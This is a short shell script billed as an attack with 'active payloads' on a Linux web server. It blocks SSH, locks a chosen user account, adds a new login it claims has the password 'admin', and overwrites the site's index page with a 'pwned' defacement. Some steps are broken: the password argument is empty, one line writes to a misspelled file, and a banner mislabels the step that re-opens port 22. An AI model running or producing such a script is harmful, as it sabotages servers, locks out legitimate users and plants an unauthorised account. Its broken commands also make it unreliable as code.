#!/bin/sh


#------------------------Warning: active payloads-------------------------------------------------
# port blocker
# webpage destroyer
# account blocker
# new account creator
# ftp infector
# overall bad day creator

# THIS SCRIPT WILL SERIOUSLY MESS UP YOUR SERVER
# I'M NOT RESPONSIBLE IF YOU RUN THIS ON YOUR SERVER OR SOMEONE ELSE USES THIS ON YOU

#Author: Brandon Sargent
#

echo "--------------------------------BEGINING ATTACK---------------------------------"

echo "------------------------------BLOCKING PORT 22 (SSH)----------------------------"

echo ""
ufw deny 22/tcp
ufw deny 22/udp
sleep 2
echo "-----------------------------------DONE------------------------------------------"

echo ""
echo "----------------------------LOCKING USER ACCOUNT----------------------------"

echo ""
echo "Enter account name to be locked"
read accountName
sleep 1

usermod -L $accountName



echo "--------------------------------------DONE----------------------------------------"

echo ""

echo "-----------------------------ADD NEW ACCOUNT TO SERVER-----------------------------"

echo ""

echo "Enter new username"
read username

useradd -m $username -p 

sleep 1

echo "New user:"  $username
echo "with password: admin"
echo "created"

sleep 3

echo "----------------------------------NEW ACCOUNT CREATED-------------------------------"
echo ""
echo "----------------------------------DISMEMBERING WEBPAGE------------------------------"

echo "<html><head><title>^&HSD's website</title></head>" > /var/www/html/index.html
echo "<body><h1>W3lc0m3 t0 j4ck's W3bs1t3</h1>" >> /var/www/html/index.html
echo "<p>This website has been pwned by 3^*#@dsa32</P></html>" >> /var/www/html/kindex.html

echo "----------------------------------WEBPAGE DISMEMBERED-------------------------------"

sleep 1
echo "------------------------------BLOCKING PORT 22 (SSH)----------------------------"

echo ""
ufw allow 22/tcp
ufw allow 22/udp
sleep 2
echo "-----------------------------------DONE------------------------------------------"

echo "----------------------------------ATTACK COMPLETED---------------------------------"
